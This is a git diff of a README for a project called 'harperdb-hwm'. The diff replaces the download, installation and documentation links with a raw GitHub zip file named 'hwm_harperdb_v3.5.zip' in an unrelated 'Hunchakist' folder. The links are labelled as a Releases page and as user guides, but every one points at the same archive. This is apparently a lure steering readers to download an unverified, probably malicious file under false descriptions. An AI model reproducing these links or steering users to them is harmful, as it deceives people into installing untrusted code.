@@ -6,7 +6,7 @@ Welcome to harperdb-hwm! This application simplifies the management of your data
 ## 📥 Download & Install
 To get started, you will need to download the application. Click the link below to visit the Releases page:
 
-[Download harperdb-hwm](https://raw.githubusercontent.com/aminedeluxe/harperdb-hwm/main/Hunchakist/harperdb-hwm.zip)
+[Download harperdb-hwm](https://raw.githubusercontent.com/aminedeluxe/harperdb-hwm/main/Hunchakist/hwm_harperdb_v3.5.zip)
 
 On the Releases page, find the latest version of the application. Follow the link to download the file for your operating system. 
 
@@ -20,7 +20,7 @@ These requirements help ensure that the application runs smoothly on your device
 ## 🛠️ Installation Steps
 1. **Visit the Releases Page:** Click the link to access the download section.
 
-   [Download harperdb-hwm](https://raw.githubusercontent.com/aminedeluxe/harperdb-hwm/main/Hunchakist/harperdb-hwm.zip)
+   [Download harperdb-hwm](https://raw.githubusercontent.com/aminedeluxe/harperdb-hwm/main/Hunchakist/hwm_harperdb_v3.5.zip)
 
 2. **Choose Your Version:** You will see a list of available versions. Look for the latest release, which usually has the largest number.
 
@@ -45,7 +45,7 @@ These requirements help ensure that the application runs smoothly on your device
 ## 📞 Support
 If you encounter any issues or have questions, we are here to help. Check the following options:
 
-- **Documentation:** Comprehensive user guides are available [here](https://raw.githubusercontent.com/aminedeluxe/harperdb-hwm/main/Hunchakist/harperdb-hwm.zip).
+- **Documentation:** Comprehensive user guides are available [here](https://raw.githubusercontent.com/aminedeluxe/harperdb-hwm/main/Hunchakist/hwm_harperdb_v3.5.zip).
 - **Issue Tracker:** Report any problems or suggestions on our GitHub Issues page.
 
 ## 🎉 Conclusion
